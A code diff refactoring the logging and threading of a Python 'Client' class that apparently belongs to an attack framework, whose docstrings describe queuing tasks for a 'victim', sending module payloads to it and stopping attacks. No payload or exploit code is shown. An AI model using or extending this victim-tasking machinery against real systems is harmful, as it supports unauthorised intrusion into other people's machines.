@@ -3,7 +3,7 @@ from queue import Queue
 import time
 import threading 
 from .Logger import Logger
-import  _thread
+from threading import Thread
 
 class Client:
     '''
@@ -22,14 +22,13 @@ class Client:
         self.stopattack=False
         self.taskresult={}
         self.tasksemaphore={}
-        self.logger=Logger(f'client {self.clientid}')
+        self.logger = Logger()
 
     def pop_latest_task(self):
         '''
         Pops the latest task from task queue of this victim
         If there are no tasks, it returns None
         '''
-        self.logger.debug('client is fetching task')
         try:
             return self.taskqueue.get(False)
         except:
@@ -40,7 +39,7 @@ class Client:
         Stops attacks on this client immediately
         This function clears task queue and set stopattack=True to prevent further attacks
         '''
-        self.logger.debug('stop attack on client')
+        self.logger.warning(f'Stop All Attack on Client {self.clientid}')
         self.stopattack=True
         self.taskqueue=Queue()
 
@@ -52,7 +51,7 @@ class Client:
         If an callback parameter is a callable function was passed in, it starts a new thread to pass result of execution and pass it to callback function and returns taskid
         If the callback parameter is not callable, it simply send the payload to the client and return the taskid (so that when you want to send a payload asynchronously, you don't have to create a useless function to be passed in)
         '''
-        self.logger.debug(f'sending payload')
+        self.logger.debug(f'Sending Payload to Client {self.clientid}')
         if self.stopattack:
             raise Exception("Attack on this client should be stopped")
         payload=moduleobj.payload
@@ -67,8 +66,10 @@ class Client:
         elif callable(callback):
             def thread_callback():
                 semaphore.acquire()
-                callback(self,self.taskresult[taskid] ) #callback(client,)
-            _thread.start_new_thread( thread_callback, tuple())
+                callback(self,self.taskresult[taskid] )
+            t = Thread(target=thread_callback)
+            t.setDaemon(True)
+            t.start()
         return taskid
     
     def get_taskresult(self,taskid:str):
